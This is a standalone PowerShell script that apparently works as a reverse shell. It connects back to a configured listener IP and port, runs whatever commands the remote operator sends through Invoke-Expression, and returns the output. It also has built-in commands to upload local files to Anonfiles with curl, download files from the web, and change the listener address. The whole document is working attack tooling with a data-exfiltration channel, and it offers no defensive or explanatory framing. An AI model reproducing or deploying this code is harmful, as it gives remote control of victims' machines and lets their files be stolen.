try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
catch
{
	New-Item "listener.txt" | ForEach-Object { Write-Host "Can't find listener.txt file, creating it..." }
	$server = ""
}
while ($server -in @($null, "")) { $server = Read-Host "Enter listener IP and Port! [x.x.x.x:xxxxx]"; Add-Content -Value $server -Path "listener.txt" }

Write-Host ("Connecting to " + $server.Replace("'", "").Replace(",", ":").Replace(" ", ""))

$server = $server.Split(":")
$ip = $server[0]
$port = $server[1]

while ($TCPClient.Connected -ne "True")
{
	Start-Sleep -Seconds 1
	try
	{
		Invoke-Expression ('$TCPClient' + "= New-Object Net.Sockets.TCPClient('$ip', $port)")
	}
	catch { }
}

Write-Host "Sucessfully Connected!"

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function InvokeCustomCommands ($Action)
{
	$SplitAction = $Action.Split()
	if ($Action -eq "help")
	{
		WriteToStream "
/exit - ends the connection
/upload [FileName] - uploads a file to Anonfiles
/download [Uri] [FileName] - downloads a file frome the web
/server <set [IP]> - shows or sets the listener server
"
	}
	#end connection
	if ($Action -eq "exit") { $StreamWriter.Close(); Exit 0 }
	
	#upload a file
	if ($SplitAction[0] -eq "upload")
	{
		function AnonUpload ($file) { cmd /c "curl -F "file=@$file" https://api.anonfiles.com/upload" | Select-String "full" -OutVariable filelink; WriteToStream ("Download Here:" + $filelink) }
		$file = $SplitAction[1]
		if (((Test-Path $file) -eq $true) -and ((Get-Item $file).Extension -ne "")) { $file = (Get-Item $file).FullName; AnonUpload ($file) }
		else { WriteToStream "No Such File!" }
	}
	#download a file
	if ($SplitAction[0] -eq "download")
	{
		try { Invoke-WebRequest -Uri $SplitAction[1] -OutFile $SplitAction[2] }
		catch { WriteToStream "Error Downloading!" }
	}
	#edits the listener.txt file
	if ($SplitAction[0] -eq "server")
	{
		if ($SplitAction[1] -eq "set")
		{
			if ($SplitAction[2] -ne $null)
			{
				$server = $SplitAction[2]
				Clear-Content -Path "listener.txt"
				Add-Content -Value $server -Path "listener.txt"
				WriteToStream "Sucessfully Set Server!"
			}
			else { WriteToStream "Enter listener IP and Port! [x.x.x.x:xxxxx]" }
			
		}
		else
		{
			Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") | ForEach-Object { WriteToStream $_ }
		}
	}
	if ($SplitAction[0] -notin @("help", "exit", "upload", "download", "server")) { WriteToStream "Invalid Command!" }
}

function WriteToStream ($String)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | ForEach-Object { 0 }
	
	$StreamWriter.Write($String + "`n[DEEZ NUTS] > ")
	$StreamWriter.Flush()
	
	Write-Host $String
}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::ASCII).GetString($Buffer, 0, $BytesRead - 1)
	if ($Command.Substring(0, 1) -eq "/") { InvokeCustomCommands  $Command.Substring(1) }
	else
	{
		$Output = try
		{
			Invoke-Expression $Command 2>&1 | Out-String
		}
		catch
		{
			$_ | Out-String
		}
		
		
		WriteToStream ($Output)
	}
}
$StreamWriter.Close()
Clear-Host